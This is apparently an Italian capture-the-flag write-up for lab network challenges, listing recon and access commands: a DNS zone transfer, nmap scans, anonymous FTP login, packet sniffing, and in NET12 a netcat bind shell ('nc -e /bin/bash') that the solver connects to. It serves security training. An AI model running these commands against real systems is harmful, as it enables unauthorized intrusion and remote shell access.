# NETWORK 1


## NET03
```bash
dig axfr @192.168.14.96 vdsizone.transfer
```

faccio una richiesta http, a `192.168.14.96` con host `sup3r-s3cr3t-b4ck3nd` sperando di accedere a una qualche pagina nascosta in base all'hostname:
```bash
curl -H "Host: sup3r-s3cr3t-b4ck3nd.vdsizone.transfer" http://192.168.14.96
```

otteniamo come risposta la flag.

## NET05
facciamo uno scan dei servizi piu probabili con nmap:
```bash
nmap -sT 192.168.14.99
```

mi accorgo che e' aperta la porta 8080, **associata di solito** ad un `http-proxy`.

se provo a connettermi, ottengo una pagina web con vari indizi per arrivare alla flag.

con firefox, se guardo i flag della risposta http trovo facilmente la flag

## NET06
eseguendo `nmap`
```bash
nmap -sT 192.168.14.101
```

scopro che sulla porta 21 c'e' in esecuzione probabilmente `ftp`.

completamente a random ho provato ad accedere con `username` e `password`: `anonymous`. ed ha funzionato.

una volta aperta la sessione `ftp` con `get` ottengo la flag dentro al omonimo file di testo.

## NET 07
connettendomi a `192.168.14.105` scopro che la porta 9999  e' configurata per mandare in broadcast un certo mesaggio.

con `tcpdump` guardo cosa passa nell'interfaccia di rete e filtro per ip sorgente:
```bash
sudo tcpdump -v -i VDSI_0341922 src 192.168.14.105 -A
```
oppure, mi metto in ascolto con `nc` su quella porta:
```bash
nc -u 192.168.14.105 -p 9999 -l
```

aspetto qualche secondo e ottengo la flag.

**udp broadcast**: permette di inviare datagrammi udp a tutti i computer nella rete. 
* filtrando per l'ip posso ottenere i dati!

## NET08
```bash
nmap -sT 192.168.14.106
```

trovo che e' aperta la porta `ftp`, tento di collegarmi per vedere che versione e' installata.

sulla versione `2.3.4` c'e' un'importante CVE, una volta trovato il numero corrispondente su internet abbiamo trovato la flag.

## NET09


## NET10
Aprendo con wireshark, ci sono 5 pacchetti DNS. Questi contengono un'hostname, una parte di questo e' in base 16.

Per ottenere la flag basta concatenare i segmenti in base 16 e convertirli in testo ASCII.

```bash
564453497b
646e355f33
7866316c5f
6831646433
6e7d
```

# NETWORK 2

## NET12
con nmap trovo che la porta `8080` e' aperta, e provo a connettermi con il browser.

Trovo un'interfaccia, questa mi permette di scegliere su che porta su cui eseguire `nc` che da l'input alla bash.

Il comando eseguito dall'interfaccia e':
```bash
nc -lvnp 9000 -e /bin/bash
```

posso connettermi alla bash con:
```bash
nc 192.168.14.115 9000
```

## NET13
apro la connessione `SSH`, ora devo scoprire i servizi di rete attivi.

ottengo le porte aperte con:
```bash
netstat -tulpn
```

pvedo che la `9999` e' aperta, allora con:
```bash
nc 127.0.0.1 9999
```

ottengo la flag.